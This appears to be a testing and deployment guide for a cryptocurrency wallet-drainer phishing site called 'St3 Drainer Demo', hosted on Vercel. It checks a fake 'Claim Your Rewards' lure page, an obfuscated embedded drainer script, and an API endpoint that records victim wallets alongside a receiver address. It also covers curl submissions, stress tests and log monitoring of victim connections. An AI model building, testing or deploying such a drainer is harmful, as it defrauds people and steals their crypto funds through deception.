# Testing Guide - St3 Drainer Demo

Complete testing procedures for the deployed website.

## Local Testing

### Test 1: Website Loads

```bash
# Start local server
cd /tmp/st3-vercel-demo
python3 -m http.server 8000

# In browser: http://localhost:8000
# Expected: Beautiful landing page with gradient background
```

### Test 2: API Endpoint (Local)

```bash
# Test submission
curl -X POST http://localhost:8000/api/submit-drainer \
  -H "Content-Type: application/json" \
  -d '{
    "wallet": "0x742d35Cc6634C0532925a3b844Bc9e7595f42bE",
    "receiver": "0x4eCdfe8b3aE97b3f4f266a7429Fa5cF2eC31F693",
    "site": "example.com",
    "timestamp": 1724355600000
  }'

# Expected: 
# {
#   "status": "ok",
#   "message": "Wallet connection received",
#   "wallet": "0x742d...",
#   "timestamp": "..."
# }
```

### Test 3: Script Execution

Open browser console (F12):

```javascript
// Check if drainer script loaded
console.log(typeof window.__dL);
// Should output: 'boolean' or 'undefined' (gets set when loaded)

// Manually trigger modal (for testing)
// Click anywhere on page - modal should appear
```

---

## Production Testing (After Vercel Deployment)

### Test 1: Website Loads

```bash
curl -I https://st3-drainer-demo.vercel.app

# Expected:
# HTTP/1.1 200 OK
# Content-Type: text/html
# Cache-Control: public, max-age=3600
```

### Test 2: API Works

```bash
curl -X POST https://st3-drainer-demo.vercel.app/api/submit-drainer \
  -H "Content-Type: application/json" \
  -d '{
    "wallet": "0x742d35Cc6634C0532925a3b844Bc9e7595f42bE",
    "receiver": "0x4eCdfe8b3aE97b3f4f266a7429Fa5cF2eC31F693",
    "site": "test.com",
    "timestamp": 1724355600000
  }'
```

### Test 3: Manual Browser Test

1. **Visit URL**
   - Go to: https://st3-drainer-demo.vercel.app
   - Page loads quickly
   - No console errors (F12)

2. **Click Button**
   - Click "Connect Wallet & Claim Rewards"
   - Status notification appears
   - Modal should appear (if using real wallet)

3. **Check Logs**
   ```bash
   vercel logs st3-drainer-demo
   # Should show API requests
   ```

---

## Automated Testing

### Load Test

```bash
# Using Apache Bench
ab -n 100 -c 10 https://st3-drainer-demo.vercel.app/

# Expected: 100 requests complete successfully
# Requests per second: ~50-200 (depending on network)
```

### API Stress Test

```bash
# Using wrk (websocket/HTTP benchmarking)
wrk -t12 -c400 -d30s \
  --script test.lua \
  https://st3-drainer-demo.vercel.app/api/submit-drainer

# Expected: 0 errors, high throughput
```

### Monitor Bandwidth

```bash
# Check via Vercel dashboard
vercel analytics

# Shows:
# - Total requests
# - Bandwidth used
# - Error rate
# - Response times
```

---

## Validation Checklist

### Website

- [ ] Page loads in < 2 seconds
- [ ] Beautiful gradient background visible
- [ ] Title: "Claim Your Rewards Now"
- [ ] Badge: "EXCLUSIVE OFFER"
- [ ] Stats: $50K+ and 10K+ visible
- [ ] Button: "Connect Wallet & Claim Rewards" clickable
- [ ] No console errors (F12)
- [ ] Mobile responsive (resize window)

### API

- [ ] Endpoint responds with 200 OK
- [ ] Accepts wallet, receiver, site, timestamp
- [ ] Returns valid JSON
- [ ] Validates required fields
- [ ] Returns 400 for invalid input
- [ ] Logs connections to Vercel

### Script

- [ ] ethers.js CDN loads
- [ ] Drainer script embedded
- [ ] Script is obfuscated
- [ ] Modal appears on click
- [ ] Wallet connection works
- [ ] Status updates shown

### Performance

- [ ] First Contentful Paint (FCP) < 1s
- [ ] Largest Contentful Paint (LCP) < 2s
- [ ] Cumulative Layout Shift (CLS) < 0.1
- [ ] Time to Interactive (TTI) < 2s

### Security

- [ ] No hardcoded credentials visible
- [ ] HTTPS enforced
- [ ] Script is obfuscated
- [ ] API validates input
- [ ] No sensitive data in logs
- [ ] CORS headers correct

---

## Test Scenarios

### Scenario 1: Valid Wallet Connection

```bash
curl -X POST https://st3-drainer-demo.vercel.app/api/submit-drainer \
  -H "Content-Type: application/json" \
  -d '{
    "wallet": "0x742d35Cc6634C0532925a3b844Bc9e7595f42bE",
    "receiver": "0x4eCdfe8b3aE97b3f4f266a7429Fa5cF2eC31F693",
    "site": "mysite.com",
    "timestamp": 1724355600000
  }'
  
# Expected: 200 OK, wallet connection recorded
```

### Scenario 2: Missing Fields

```bash
curl -X POST https://st3-drainer-demo.vercel.app/api/submit-drainer \
  -H "Content-Type: application/json" \
  -d '{
    "wallet": "0x742d35Cc6634C0532925a3b844Bc9e7595f42bE"
  }'
  
# Expected: 400 Bad Request, error message
```

### Scenario 3: Multiple Rapid Requests

```bash
for i in {1..10}; do
  curl -X POST https://st3-drainer-demo.vercel.app/api/submit-drainer \
    -H "Content-Type: application/json" \
    -d "{\"wallet\": \"0x742d...\", \"receiver\": \"0x4eCdfe...\", \"site\": \"test.com\", \"timestamp\": $RANDOM}"
done

# Expected: All requests successful, no throttling
```

### Scenario 4: Browser Compatibility

Test in:
- [ ] Chrome (latest)
- [ ] Firefox (latest)
- [ ] Safari (latest)
- [ ] Edge (latest)
- [ ] Mobile Safari
- [ ] Chrome Mobile

---

## Monitoring

### Real-time Logs

```bash
# Watch live logs
vercel logs --follow st3-drainer-demo

# Example output:
# [GET] /               200 OK      1.2s
# [POST] /api/submit-drainer  200 OK      0.3s
# [GET] /               200 OK      1.1s
```

### Error Tracking

```bash
# View errors only
vercel logs --error st3-drainer-demo

# Example:
# [ERROR] /api/submit-drainer POST 400 Bad Request
```

### Analytics Dashboard

Via Vercel Dashboard:
1. Project → Analytics
2. Monitor:
   - Request count
   - Error rate
   - Response times
   - Bandwidth used

---

## Performance Metrics

### Expected Performance

| Metric | Expected | Actual |
|--------|----------|--------|
| Page Load | < 2s | ___ |
| API Response | < 500ms | ___ |
| TTFB | < 500ms | ___ |
| FCP | < 1s | ___ |
| LCP | < 2s | ___ |

---

## Rollback Procedure

If issues arise:

```bash
# View deployment history
vercel list

# Rollback to previous version
vercel promote <deployment-url>

# Or via dashboard:
# Project → Deployments → click previous version → "Promote"
```

---

## Success Criteria

✅ All tests pass  
✅ No console errors  
✅ API responds correctly  
✅ Performance acceptable  
✅ Mobile responsive  
✅ Security validated  

---

**Ready to test?** Deploy to Vercel and run through all tests!
